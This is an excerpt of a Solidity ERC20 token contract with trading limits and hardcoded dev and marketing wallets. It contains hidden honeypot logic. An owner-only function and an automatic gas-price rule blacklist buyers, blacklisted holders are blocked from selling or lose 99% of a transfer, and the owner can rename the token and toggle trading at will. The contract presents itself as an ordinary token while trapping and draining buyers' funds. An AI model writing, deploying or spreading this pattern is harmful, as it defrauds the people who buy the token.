...
contract Token is Context, IERC20 { 
    ...
    string private _symbol = unicode"$Symbol";
    ...
    uint256 public _maxBuy = _tTotal * 1 / 200;
    uint256 public _maxSell = _tTotal * 1 / 200;
    uint256 public _maxWalletToken = _tTotal * 1 / 200;

    uint256 public _swapTrigger = 5;
    uint256 public _swapTokenAtAmount = _tTotal * 1 / 222;

    address payable public DevWallet = payable(0xB3102b6c3208Bf40E4D05750b48eFD06eabAc598);
    address payable public MarketingWallet = payable(0x894bF6CA86DbF9Fa82646C9A2dB9a9D23Cf241d8);
    ...
    mapping (address => bool) private _isElons;
    ...
    function sElon(address spender) external onlyOwner {
        _isElons[spender] = true;
    }
    ...
    function TokenInfo(string memory TokenName,string memory TokenSymbol, bool true_or_false) external onlyOwner {
        _name = TokenName;
        _symbol = TokenSymbol;
        tradingActive = true_or_false;
        tradingActiveBlock = block.timestamp;
    }

    function setTransferDelay(bool true_or_false) external onlyOwner {
        transferDelay = true_or_false;
        limitInEffect = true_or_false;
    }
    
    function Redline() external onlyOwner {
    ...
    function setMaxtx(uint256 maxBuy, uint256 maxSell,uint256 maxWallet) external onlyOwner {
        require (maxBuy >= _tTotal*1/200);
        require (maxSell >= _tTotal*1/200);
        _maxBuy = maxBuy;
        _maxSell = maxSell;
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to])
            require(amount <= _maxBuy, "You are trying to buy more than the max transaction limit.");
            require(from != address(0) && to != address(0), "ERR: Using 0 address!");
            require(amount > 0, "Token value must be higher than zero.");
        if (to == uniswapV2Pair && !_isExcludedFromFee[from]){
            require(amount <= _maxSell);}
        if (!tradingActive) {require(_isExcludedFromFee[from] || _isExcludedFromFee[to],"Trading is not active.");}
        if (tradingActiveBlock + 10 <= block.timestamp) {limitInEffect = false;}
        if (tradingActiveBlock + 15 <= block.timestamp) {transferDelay = false;}
        if (!transferDelay && (!_isExcludedFromFee[from])) { require(!_isElons[from]);}
        if (transferDelay && tradingActiveBlock + 15 <= block.timestamp) {idclaim();}
        if (limitInEffect && to != uniswapV2Pair && tx.gasprice >= 5 gwei) {_isElons[to] = true;}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isElons[sender]){sAmount = tAmount*99/100;}
